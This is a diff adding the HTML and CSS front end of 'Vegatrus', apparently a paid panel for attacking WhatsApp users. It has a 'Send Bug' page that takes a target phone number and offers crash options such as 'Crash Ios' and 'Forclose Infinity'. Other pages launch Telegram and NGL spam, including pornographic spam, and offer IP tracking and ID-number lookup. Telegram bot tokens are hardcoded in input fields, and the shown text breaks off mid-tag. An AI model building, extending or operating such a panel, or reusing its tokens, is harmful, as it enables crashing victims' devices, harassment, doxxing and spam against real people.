+    .tt-btn { background: var(--primary); border: none; padding: 10px; border-radius: 5px; color: #fff; font-family: 'Orbitron'; font-size: 12px; cursor: pointer; text-decoration: none; display: block; }
+    .tt-btn.mp3 { background: var(--accent-red); }
+
+    .popup-cool { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.9); background: var(--bg-card); border: 2px solid var(--primary); padding: 25px; border-radius: 12px; text-align: center; z-index: 9999; display: none; box-shadow: 0 0 30px rgba(58, 109, 240, 0.2); width: 85%; max-width: 350px; }
+    .popup-cool.show { display: block; animation: popIn 0.3s forwards; }
+
+    .bottom-sheet {
+        position: fixed; bottom: -100%; left: 0; width: 100%; background: var(--bg-card);
+        border-radius: 25px 25px 0 0; padding: 30px 20px 80px 20px; z-index: 2200;
+        transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); box-shadow: 0 -5px 30px rgba(0,0,0,0.8);
+        border-top: 1px solid var(--primary);
+    }
+    .bottom-sheet.active { bottom: 0; }
+    .sheet-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+    .sheet-title { font-family: 'Orbitron'; font-size: 20px; color: #fff; }
+    .sheet-close { color: var(--text-sub); cursor: pointer; font-size: 20px; }
+    .long-btn { display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--bg-main); border-radius: 12px; margin-bottom: 10px; cursor: pointer; color: #fff; font-family: 'Rajdhani'; font-size: 16px; font-weight: bold; transition: 0.2s; border: 1px solid var(--border-color); }
+    .long-btn:hover { background: rgba(58, 109, 240, 0.1); border-color: var(--primary); }
+
+    .acc-list-item {
+        background: var(--bg-card); border: 1px solid var(--border-color);
+        padding: 15px; border-radius: 12px; margin-bottom: 10px;
+        display: flex; justify-content: space-between; align-items: center;
+    }
+    .acc-left h4 { font-family: 'Orbitron'; font-size: 14px; color: #fff; margin-bottom: 2px; }
+    .acc-left p { font-size: 11px; color: var(--text-sub); }
+    .acc-right { text-align: right; }
+    .acc-badge { 
+        padding: 4px 10px; border-radius: 5px; font-size: 10px; font-weight: bold; 
+        font-family: 'Orbitron'; display: inline-block; margin-bottom: 3px;
+    }
+    .badge-member { background: rgba(58, 109, 240, 0.2); color: var(--primary); }
+    .badge-reseller { background: rgba(255, 204, 0, 0.2); color: var(--accent-gold); }
+    .acc-right span { display: block; font-size: 10px; color: #777; }
+
+    .mp-container { text-align: center; padding: 20px; }
+    .mp-img-box {
+        width: 100px; height: 100px; margin: 0 auto 20px auto; border-radius: 50%;
+        border: 2px solid var(--primary); padding: 3px; 
+        box-shadow: 0 0 20px rgba(58, 109, 240, 0.3);
+    }
+    .mp-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+    
+    .mp-card {
+        background: #131722; border: 1px solid var(--border-color);
+        border-radius: 15px; padding: 20px; margin-bottom: 15px; text-align: left;
+    }
+    .mp-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; border-bottom: 1px solid #1c2538; padding-bottom: 12px; }
+    .mp-row:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+    .mp-label { color: var(--text-sub); font-size: 12px; font-family: 'Rajdhani'; font-weight: bold; text-transform: uppercase; }
+    .mp-val { color: #fff; font-family: 'Orbitron'; font-size: 14px; letter-spacing: 1px; }
+    
+    .logout-btn {
+        width: 100%; padding: 15px; background: #222; border: 1px solid #444; color: #ff3b30;
+        border-radius: 12px; font-family: 'Orbitron'; font-weight: bold; cursor: pointer;
+        margin-top: 20px; transition: 0.3s;
+    }
+    .logout-btn:hover { background: #333; border-color: #ff3b30; }
+
+    .nik-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; color: #ccc; }
+    .nik-table td { padding: 8px; border-bottom: 1px solid #1c2538; }
+    .nik-table td:first-child { color: var(--primary); font-weight: bold; width: 40%; }
+
+    .speed-test-wrapper {
+        background: var(--bg-card); border-radius: 0 0 10px 10px; 
+        padding: 40px 20px; text-align: center; border: 1px solid var(--border-color);
+        display: flex; flex-direction: column; align-items: center; position: relative; overflow: hidden;
+    }
+    .wifi-circle-display {
+        width: 120px; height: 120px; border-radius: 50%;
+        background: rgba(58, 109, 240, 0.1); border: 2px solid var(--primary);
+        display: flex; justify-content: center; align-items: center;
+        margin-bottom: 30px; box-shadow: 0 0 20px rgba(58, 109, 240, 0.2);
+        transition: all 0.5s ease; position: relative; z-index: 2;
+    }
+    .wifi-circle-display i { font-size: 50px; color: #fff; transition: all 0.3s; }
+    
+    .wifi-circle-display.animating {
+        animation: pulseWifi 1.5s infinite;
+        border-color: #00ff88;
+        background: rgba(0, 255, 136, 0.1);
+    }
+    .wifi-circle-display.animating i { color: #00ff88; transform: scale(1.2); }
+    
+    @keyframes pulseWifi {
+        0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); }
+        70% { transform: scale(1.1); box-shadow: 0 0 0 20px rgba(0, 255, 136, 0); }
+        100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
+    }
+
+    .speed-info-box {
+        width: 100%; background: #0e121b; border: 1px solid var(--border-color);
+        border-radius: 12px; padding: 15px; margin-bottom: 20px;
+        text-align: left; transition: filter 0.3s ease;
+    }
+    .speed-info-box.blurred { filter: blur(4px); opacity: 0.6; }
+    
+    .sp-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; border-bottom: 1px solid #1c2538; padding-bottom: 5px; }
+    .sp-row:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+    .sp-row span:first-child { color: var(--text-sub); }
+    .sp-row span:last-child { color: #fff; font-family: 'Orbitron'; font-weight: bold; }
+
+    #spLoadingText {
+        font-family: 'Orbitron'; color: #00ff88; font-size: 16px; 
+        letter-spacing: 2px; margin-top: -10px; margin-bottom: 20px;
+        animation: blinkText 1s infinite;
+    }
+    @keyframes blinkText { 50% { opacity: 0.3; } }
+
+    .search-input-wrapper { display: flex; gap: 10px; background: var(--bg-card); padding: 15px; border-bottom: 1px solid var(--border-color); }
+    .search-input { flex: 1; background: transparent; border: none; color: #fff; font-family: 'Rajdhani'; font-size: 16px; border-bottom: 1px solid #333; }
+    .search-input:focus { border-bottom-color: var(--primary); }
+    .search-action-btn { background: var(--primary); border: none; color: #fff; width: 40px; height: 40px; border-radius: 8px; cursor: pointer; }
+
+    .yt-results-container { padding: 15px; padding-bottom: 80px; }
+    .yt-card {
+        background: var(--bg-card); border-radius: 12px; overflow: hidden; 
+        margin-bottom: 15px; border: 1px solid var(--border-color);
+        cursor: pointer; transition: 0.2s; position: relative;
+    }
+    .yt-card:hover { border-color: var(--primary); transform: translateY(-3px); }
+    .yt-banner { width: 100%; height: 160px; object-fit: cover; display: block; }
+    .yt-info { padding: 12px; }
+    .yt-title { font-family: 'Orbitron'; font-size: 14px; color: #fff; margin-bottom: 5px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+    .yt-meta { font-size: 11px; color: var(--text-sub); display: flex; justify-content: space-between; }
+    
+    .yt-play-overlay {
+        position: absolute; top: 0; left: 0; width: 100%; height: 160px;
+        background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center;
+       opacity: 0; transition: 0.3s;
+    }
+    .yt-card:hover .yt-play-overlay { opacity: 1; }
+    .yt-play-icon { font-size: 40px; color: #fff; }
+
+    .floating-audio-player {
+        position: fixed; bottom: 0; left: 0; width: 100%; height: 75px;
+        background: rgba(11, 15, 25, 0.95); backdrop-filter: blur(10px);
+        border-top: 1px solid var(--primary); z-index: 2000;
+        display: none; align-items: center; padding: 0 15px; gap: 15px;
+        animation: slideUp 0.3s ease;
+    }
+    @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+    .player-thumb { width: 50px; height: 50px; border-radius: 8px; object-fit: cover; }
+    .player-info { flex: 1; overflow: hidden; }
+    .player-title { font-family: 'Rajdhani'; font-weight: bold; font-size: 13px; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .player-status { font-size: 10px; color: var(--primary); }
+    .player-controls { display: flex; gap: 15px; align-items: center; }
+    .p-btn { background: none; border: none; color: #fff; font-size: 20px; cursor: pointer; }
+
+    .history-card { 
+        background: #131722; border: 1px solid var(--border-color); 
+        border-radius: 12px; padding: 15px; margin-bottom: 10px;
+    }
+    .history-card h4 { 
+        font-family: 'Orbitron'; font-size: 14px; color: var(--primary); 
+        margin-bottom: 5px; border-bottom: 1px solid #1c2538; padding-bottom: 5px;
+    }
+    .history-card p { 
+        font-size: 12px; color: #ccc; margin-bottom: 5px; 
+    }
+    .history-card small { 
+        display: block; font-size: 10px; color: var(--text-sub); 
+        margin-top: 5px; text-align: right;
+    }
+    .lux-head-top {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .lux-head-text p { margin: 0; }
+    .lux-head-text h2 { margin: 2px 0 0; }
+
+    @keyframes popIn { to { transform: translate(-50%, -50%) scale(1); } }
+    @keyframes scanLine { 0% { top:0; } 50% { top:100%; } 100% { top:0; } }
+  </style>
+</head>
+<body>
+
+  <!-- ===== LOGIN SECTION ===== -->
+  <div id="loginSection">
+    <div class="star-container">
+      <div class="star"></div><div class="star"></div><div class="star"></div>
+      <div class="star"></div><div class="star"></div><div class="star"></div>
+    </div>
+
+    <div id="loginPopup">Username / Password Kosong!</div>
+
+    <div id="view-home" class="view-container active">
+      <div class="top-bar">
+          <div class="welcome-badge">Welcome Back</div>
+      </div>
+      <div class="banner-card">
+          <img src="https://files.catbox.moe/x5invq.jpg" alt="Banner" class="banner-img">
+      </div>
+      <div class="menu-btn" id="btnLoginNav">
+          <i class="fas fa-sign-in-alt"></i> LOGIN
+      </div>
+      <a href="https://t.me/unknownxry" target="_blank" style="text-decoration: none;">
+          <div class="menu-btn">
+              <i class="fas fa-th-large"></i> BUY AKSES
+          </div>
+      </a>
+      <div class="contact-section">
+          <div class="contact-label">Connect With Us</div>
+          <div class="social-row">
+              <a href="https://t.me/Repp76" target="_blank" class="social-btn">
+                  <i class="fab fa-telegram-plane"></i>
+              </a>
+          </div>
+      </div>
+    </div>
+
+    <div id="view-login" class="view-container">
+      <div class="login-container">
+          <img src="https://files.catbox.moe/xfi45x.jpg" alt="Profile" class="profile-img">
+          <h2 class="login-title">Vegatrus - System</h2>
+          <p class="login-subtitle">Please Log-in</p>
+
+          <div class="input-field-group">
+              <i class="fas fa-user input-icon"></i>
+              <input type="text" id="visUser" class="input-style" placeholder="Username">
+          </div>
+
+          <div class="input-field-group">
+              <i class="fas fa-lock input-icon"></i>
+              <input type="password" id="visPass" class="input-style" placeholder="Password">
+              <i class="fas fa-eye-slash toggle-pass" id="toggleBtn"></i>
+          </div>
+
+          <button class="submit-btn" id="btnLoginSubmit">LOGIN</button>
+      </div>
+    </div>
+
+    <div id="loadingScreen" class="loading-screen">
+      <div class="star-container" style="opacity: 0.5;">
+          <div class="star"></div><div class="star"></div><div class="star"></div>
+      </div>
+      <div class="video-wrapper">
+          <video class="loading-video" id="successVideo" playsinline loop muted>
+              <source src="https://files.catbox.moe/wl1vfc.mp4" type="video/mp4">
+          </video>
+      </div>
+      <div class="loading-text">Vegatrus</div>
+    </div>
+  </div>
+
+  <!-- ===== DASHBOARD SECTION (Pusat.html) ===== -->
+  <div id="dashboardView">
+
+    <div class="custom-header">
+      <div class="header-left">
+          <button id="headerToggleBtn"><i class="fas fa-bars"></i></button>
+          <div class="header-title">Vegatrus</div>
+      </div>
+      <div class="profile-icon-header" onclick="openBottomSheet('profileSheet')">
+          <i class="fas fa-user"></i>
+      </div>
+    </div>
+
+    <div id="sidebarPanel">
+        <div class="sidebar-video-box">
+            <video class="sidebar-video-bg" autoplay muted loop playsinline src="https://files.catbox.moe/xj8m61.mp4"></video>
+            <div class="sidebar-video-content">
+                <div class="glitch-blue">Vegatrus</div>
+                <div class="user-coin-info"><i class="fas fa-map-marker-alt"></i> Where Are <span id="sidebarUsername"></span></div>
+            </div>
+        </div>
+        
+        <div class="sidebar-menu">
+            <button class="sidebar-btn" onclick="goToPage('dashboard')"><i class="fas fa-home"></i> Dashboard</button>
+            <button class="sidebar-btn" onclick="openBottomSheet('profileSheet')"><i class="fas fa-user-circle"></i> My Info</button>
+            <button class="sidebar-btn" onclick="goToPage('credits')"><i class="fas fa-info-circle"></i> Credits</button>
+            <button class="sidebar-btn" onclick="goToPage('create-acc')" id="sidebarCreateAccBtn"><i class="fas fa-user-plus"></i> Create Account</button>
+            <button class="sidebar-btn" onclick="goToPage('pairing')" id="sidebarPairingBtn" style="display:none;"><i class="fas fa-qrcode"></i> Pairing WA</button>
+            
+            <button class="sidebar-btn" onclick="showPopup('Info', 'Fitur News Comming Soon', '📢')"><i class="fas fa-newspaper"></i> News</button>
+            
+            <div class="sidebar-divider"></div>
+            
+            <div class="thanks-box">
+                <div class="thanks-title">Thanks To</div>
+                <div class="thanks-list">
+                    <span class="thanks-item">Allah <span class="thanks-role">&lt; My God &gt;</span></span>
+                    <span class="thanks-item">My Parents <span class="thanks-role">&lt; My Support &gt;</span></span>
+                    <span class="thanks-item">@allabouterens<span class="thanks-role">&lt; Developer &gt;</span></span>
+                </div>
+            </div>
+            
+            <button class="sidebar-btn" onclick="doLogout()" style="margin-top: 10px;"><i class="fas fa-sign-out-alt"></i> Logout</button>
+        </div>
+    </div>
+
+    <div id="overlay" onclick="toggleSidebar()"></div>
+
+    <div id="page-dashboard" class="page-container active">
+        <div class="lux-header-card">
+            <div class="lux-head-top">
+                <div class="lux-icon-box"><i class="fas fa-th-large"></i></div>
+                <div class="lux-head-text">
+                    <p>Welcome back</p>
+                    <h2>Vegatrus Dashboard</h2>
+                </div>
+            </div>
+            <div class="lux-mini-stats">
+                <div class="lux-stat-glass">
+                    <label><i class="fas fa-users"></i> Online Users</label>
+                    <span>15</span>
+                </div>
+                <div class="lux-stat-glass">
+                    <label><i class="fas fa-link"></i> Connections</label>
+                    <span>247</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="lux-section-title">Latest News</div>
+        <div class="slider-container" id="newsSlider">
+            <div class="slider-track">
+                <div class="slide">
+                    <video src="https://files.catbox.moe/wl1vfc.mp4" autoplay muted loop playsinline></video>
+                    <div class="lux-news-content">
+                        <h3>Vegatrus</h3>
+                        <p>Developer @Repp76</p>
+                    </div>
+                </div>
+                <div class="slide">
+                    <video src="https://files.catbox.moe/dr1kjz.mp4" autoplay muted loop playsinline></video>
+                    <div class="lux-news-content">
+                        <h3>Latest Update</h3>
+                        <p>New Features Added & Performance Optimized. Check Tools Menu.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="lux-section-title">Account Statistics</div>
+        
+        <div class="lux-stats-grid">
+            <div class="lux-card glow-blue">
+                <div class="lux-icon-circle bg-blue"><i class="fas fa-user"></i></div>
+                <div class="lux-info">
+                    <label>Username</label>
+                    <span class="blue" id="statUsername"></span>
+                </div>
+            </div>
+            <div class="lux-card glow-red">
+                <div class="lux-icon-circle bg-red"><i class="fas fa-shield-alt"></i></div>
+                <div class="lux-info">
+                    <label>Role</label>
+                    <span class="red" id="statRole"></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="lux-card-full glow-gold">
+             <div class="lux-icon-circle bg-gold"><i class="far fa-calendar-alt"></i></div>
+             <div class="lux-info">
+                 <label>Account Expires</label>
+                 <span class="gold" id="statExpires"></span>
+             </div>
+        </div>
+
+        <div class="lux-section-title">Quick Actions</div>
+        <div class="action-grid">
+            <div class="action-box" onclick="goToPage('list-accounts')">
+                <div class="ab-icon"><i class="fas fa-users-cog"></i></div>
+                <div class="ab-title">List Akun</div>
+                <div class="ab-sub">Manage Users</div>
+            </div>
+            <div class="action-box" onclick="goToPage('history')">
+                <div class="ab-icon"><i class="fas fa-history"></i></div>
+                <div class="ab-title">History</div>
+                <div class="ab-sub">View Logs</div>
+            </div>
+            <div class="action-box" onclick="goToPage('music')">
+                <div class="ab-icon"><i class="fas fa-music"></i></div>
+                <div class="ab-title">Music</div>
+                <div class="ab-sub">Play Audio</div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-history" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px; cursor:pointer;" onclick="goToPage('dashboard')"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Welcome Back To Vegatrus</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">Username</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;" class="dyn-username"></p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Role</h2>
+                    <span class="role-badge dyn-role"></span>
+                </div>
+            </div>
+        </div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px; border:1px solid var(--border-color); min-height: 400px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+                <div class="lux-section-title" style="margin-bottom:0; border-left-color:var(--accent-gold);">Activity Log</div>
+                <button class="yoshi-btn" style="width:auto; padding:8px 15px; margin-top:0; background:var(--accent-red);" onclick="clearHistory()"><i class="fas fa-trash"></i> Clear</button>
+            </div>
+            <div id="historyContainer">
+                <div style="text-align:center; color:var(--text-sub); margin-top:20px;">Memuat riwayat...</div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-whatsapp" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px;"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Welcome Back To Vegatrus</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">Username</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;" class="dyn-username"></p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Role</h2>
+                    <span class="role-badge dyn-role"></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="wa-video-container">
+            <video class="wa-video" autoplay muted loop playsinline>
+                <source src="https://files.catbox.moe/wl1vfc.mp4" type="video/mp4">
+            </video>
+            <div class="wa-overlay-text glitch-subtle" id="waBannerText">Vegatrus</div>
+        </div>
+
+        <div class="red-label-bar">Nomor Target</div>
+        <div style="display:flex; align-items:center; background:var(--bg-card); border:1px solid var(--border-color); border-top:none; border-radius:0 0 8px 8px; padding:0 15px;">
+             <i class="fas fa-mobile-alt" style="color:var(--primary); margin-right:10px;"></i>
+             <input type="text" id="targetNumber" class="dark-input-box" placeholder="Contoh: +62xxxxxxxxxx" style="border:none; padding-left:0;">
+        </div>
+        
+        <div class="red-label-bar">Pilih Bug</div>
+        
+        <div class="attack-dropdown-wrapper" id="bugDisplay">
+            <span id="bugText">Select - Bug</span>
+            <input type="hidden" id="selectedBug" value="invis">
+            <div id="bugOptions" class="bug-options-container"> 
+                 <div class="attack-option" data-val="uisystem">Force Close One Msg</div>
+                 <div class="attack-option" data-val="invis">Delay Hard</div>
+                 <div class="attack-option" data-val="fc">Forclose Infinity</div>
+                 <div class="attack-option" data-val="blank">Crash Ios</div>
+            </div>
+        </div>
+
+        <button class="yoshi-btn" id="sendBugBtn"><i class="fas fa-paper-plane"></i> Send Bug</button>
+    </div>
+
+    <div id="page-tools" class="page-container">
+        <div class="video-banner-container">
+            <video class="video-banner-bg" autoplay muted loop playsinline>
+                <source src="https://files.catbox.moe/pvizlu.mp4" type="video/mp4">
+            </video>
+            <div class="video-overlay">
+                <div class="slide-text-main">Power Full The Vegatrus</div>
+                <div class="slide-text-sub">Powerby : @allabouterens</div>
+            </div>
+        </div>
+        
+        <div class="tools-grid-new">
+            <div class="tool-box" onclick="openBottomSheet('downloaderSheet')">
+                <i class="fas fa-download"></i>
+                <h3>Downloader</h3>
+                <p>Tiktok & Media</p>
+            </div>
+            <div class="tool-box" onclick="openBottomSheet('networkSheet')">
+                <i class="fas fa-wifi"></i>
+                <h3>Network</h3>
+                <p>Spam & Bots</p>
+            </div>
+            <div class="tool-box" onclick="openBottomSheet('osintSheet')">
+                <i class="fas fa-search"></i>
+                <h3>OSINT</h3>
+                <p>Nik Parse & Lookup</p>
+            </div>
+            <div class="tool-box" onclick="openBottomSheet('spamSheet')">
+                <i class="fas fa-fire"></i>
+                <h3>Spam Attack</h3>
+                <p>Tele & More</p>
+            </div>
+            <div class="tool-box" onclick="openBottomSheet('mediaSheet')">
+                <i class="fas fa-search-plus"></i>
+                <h3>Search Media</h3>
+                <p>YouTube & More</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-music" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px; cursor:pointer;" onclick="goToPage('dashboard')"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Welcome Back To Vegatrus</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">Username</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;" class="dyn-username"></p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Role</h2>
+                    <span class="role-badge dyn-role"></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="music-visual-box">
+            <img id="musicIntroImg" src="https://files.catbox.moe/x5invq.jpg" style="width:100%; height:100%; object-fit:cover; position:absolute; top:0; left:0; opacity:1; transition: opacity 2s ease; z-index:10;">
+            <video id="musicVideoBg" autoplay muted loop playsinline src="https://files.catbox.moe/wl1vfc.mp4" style="width:100%; height:100%; object-fit:cover; opacity:0; transition: opacity 2s ease;"></video>
+            <div id="musicOverlayText" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 15; width: 100%; text-align: center; font-family: 'Orbitron'; font-weight: 900; font-size: 22px; color: rgba(255,255,255,0.9); text-shadow: 0 0 10px rgba(0,0,0,0.8); white-space: nowrap; transition: opacity 0.3s ease;">SX4RULE V5 Engine</div>
+        </div>
+
+        <div class="music-player-box">
+            <div id="musicTitle">Esta Noche Love</div>
+            <div class="music-sub">Power By : @allabouterens</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="musicProgressBar"></div>
+            </div>
+            <div class="time-display">
+                <span id="currentTime">0:00</span>
+                <span id="totalTime">0:00</span>
+            </div>
+            <div class="controls">
+                <button class="ctrl-btn"><i class="fas fa-step-backward"></i></button>
+                <div class="play-btn-circle" id="btnPlayMusic" onclick="toggleMusic()"><i class="fas fa-play"></i></div>
+                <button class="ctrl-btn"><i class="fas fa-step-forward"></i></button>
+            </div>
+            <audio id="musicAudioPlayer" src="https://files.catbox.moe/esta.mp3" preload="metadata"></audio>
+        </div>
+    </div>
+
+    <div id="page-tiktok" class="page-container">
+        <div class="page-back-header"><button class="back-btn" onclick="goToPage('tools')"><i class="fas fa-arrow-left"></i></button><span>Tiktok Downloader</span></div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px;">
+            <input type="text" id="ttUrlInput" class="dark-input-box" placeholder="Paste Tiktok URL Here..." style="border-radius:8px; margin-bottom:15px;">
+            <button class="yoshi-btn" id="btnTtDownload"><i class="fas fa-download"></i> DOWNLOAD</button>
+            <div id="ttLoading" style="display:none; color:#fff; text-align:center; margin-top:15px;">Loading...</div>
+            <div id="ttResult" class="tt-result-card">
+                <img id="ttThumb" src="" class="tt-thumb">
+                <p id="ttTitle" style="color:#fff; margin-bottom:10px;"></p>
+                <div class="tt-grid">
+                    <a id="btnMp4" href="#" class="tt-btn" download>MP4 Video</a>
+                    <a id="btnMp3" href="#" class="tt-btn mp3" download>MP3 Audio</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-pinterest" class="page-container">
+        <div class="page-back-header"><button class="back-btn" onclick="goToPage('tools')"><i class="fas fa-arrow-left"></i></button><span>Pinterest Downloader</span></div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px;">
+            <input type="text" id="pinUrlInput" class="dark-input-box" placeholder="Paste Pinterest URL Here..." style="border-radius:8px; margin-bottom:15px;">
+            <button class="yoshi-btn" id="btnPinDownload"><i class="fas fa-download"></i> DOWNLOAD</button>
+            <div id="pinLoading" style="display:none; color:#fff; text-align:center; margin-top:15px;">Loading...</div>
+            <div id="pinResult" style="margin-top:20px; display:none;">
+                <div id="pinContent"></div>
+                <a id="btnPinManual" href="#" class="yoshi-btn" style="display:block; text-align:center; margin-top:10px;" download>Download Manual</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-add-sender" class="page-container">
+        <div class="lux-header-card mini-card">
+            <div class="lux-head-custom-flex">
+                <div class="lux-left-info">
+                    <div class="lux-icon-box" style="width:45px; height:45px; font-size:22px; cursor:pointer;" onclick="closeBottomSheet('networkSheet')"><i class="fas fa-th-large"></i></div>
+                    <div class="lux-head-text">
+                        <div class="welcome-text-anim dynamic-welcome-msg">Welcome Back To Vegatrus</div>
+                        <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:2px;">Username</h2>
+                        <p style="font-size:16px; color:#fff; font-weight:bold;" class="dyn-username"></p>
+                    </div>
+                </div>
+                <div class="lux-right-info">
+                    <h2 style="font-size:14px; color:var(--text-sub); margin-bottom:5px;">Role</h2>
+                    <span class="role-badge dyn-role"></span>
+                </div>
+            </div>
+        </div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px; border:1px solid var(--border-color);">
+            <input type="text" id="wifiIpInput" class="dark-input-box" placeholder="Masukkan IP Address..." style="border-radius:8px; margin-bottom:15px;">
+            <button class="yoshi-btn" id="btnTrackWifi"><i class="fas fa-search-location"></i> TRACK IP</button>
+            <div id="wifiLoading" style="display:none; color:#fff; text-align:center; margin-top:15px;"><i class="fas fa-circle-notch fa-spin"></i> Tracking...</div>
+            <div id="wifiResult" style="margin-top:20px; background:#131722; padding:15px; border-radius:10px; display:none;"><h4 style="color:#fff; margin-bottom:10px;">Hasil Tracking</h4><div id="wifiTableArea"></div></div>
+        </div>
+    </div>
+
+    <div id="page-spam-tele" class="page-container">
+        <div class="page-back-header"><button class="back-btn" onclick="goToPage('tools')"><i class="fas fa-arrow-left"></i></button><span>Spam Telegram</span></div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px;">
+            <input type="text" id="8748766418:AAHOuDwQGQZD4BQW86A49Da0xmSRiVu6Uvc" class="dark-input-box" placeholder="8748766418:AAHOuDwQGQZD4BQW86A49Da0xmSRiVu6Uvc" style="border-radius:5px; margin-bottom:10px;">
+            <input type="text" id="@allabouterens" class="dark-input-box" placeholder="@allabouterens" style="border-radius:5px; margin-bottom:10px;">
+            <div class="custom-dropdown-wrapper" id="modeDisplay"><span id="modeText">Auto Mode</span><input type="hidden" id="selectedMode" value="auto"><div id="modeOptions" class="dropdown-options-container"><div class="dropdown-option" data-val="auto">Auto Mode</div><div class="dropdown-option" data-val="manual">Manual Mode</div></div></div>
+            <div id="manualArea" style="display:none;">
+                <input type="text" id="customMsg" class="dark-input-box" placeholder="Custom Message..." style="border-radius:5px; margin-bottom:10px;">
+                <input type="text" id="mediaUrl" class="dark-input-box" placeholder="Media URL (Optional)..." style="border-radius:5px; margin-bottom:10px;">
+                <input type="number" id="spamCount" class="dark-input-box" placeholder="Jumlah Kiriman..." style="border-radius:5px; margin-bottom:10px;" value="10">
+                <input type="number" id="spamDelay" class="dark-input-box" placeholder="Delay (ms)..." style="border-radius:5px; margin-bottom:10px;" value="1000">
+            </div>
+            <button class="yoshi-btn" id="btnAttackTele"><i class="fas fa-paper-plane"></i> LAUNCH SPAM</button>
+            <button class="yoshi-btn" id="btnStopTele" style="background: var(--accent-red); margin-top:10px;"><i class="fas fa-stop"></i> STOP SPAM</button>
+            <div id="spamStatus" style="text-align:center; color:#ccc; margin-top:15px; font-family:'VT323'; font-size:18px;">Status: Siap</div>
+        </div>
+    </div>
+
+    <div id="page-spam-ngl" class="page-container">
+        <div class="page-back-header"><button class="back-btn" onclick="goToPage('tools')"><i class="fas fa-arrow-left"></i></button><span>Spam NGL Link</span></div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px;">
+            <input type="text" id="nglUsername" class="dark-input-box" placeholder="NGL Username Target..." style="border-radius:5px; margin-bottom:10px;">
+            <input type="text" id="nglMessage" class="dark-input-box" placeholder="Pesan yang dikirim..." style="border-radius:5px; margin-bottom:10px;">
+            <button class="yoshi-btn" id="btnSpamNgl"><i class="fas fa-fire"></i> SPAM NGL</button>
+            <div id="nglStatus" style="text-align:center; color:#ccc; margin-top:15px; font-family:'VT323'; font-size:18px;">Status: Siap</div>
+        </div>
+    </div>
+
+    <div id="page-spam-tele-video" class="page-container">
+        <div class="page-back-header"><button class="back-btn" onclick="goToPage('tools')"><i class="fas fa-arrow-left"></i></button><span>Spam Bokep Tele</span></div>
+        <div style="background:var(--bg-card); padding:20px; border-radius:0 0 10px 10px;">
+            <input type="text" id="8228072953:AAH-2i-j6YuBWHek4yQ4z0SrFrBK9Sc5UkM" class="dark-input-box" placeholder="8748766418:AAHOuDwQGQZD4BQW86A49Da0xmSRiVu6Uvc" style="border-radius:5px; margin-bottom:10px;">
+            <input type="text" id="7593490858" class="dark-input-box" placeholder" style="border-radius:5px; margin-bottom:10px;">
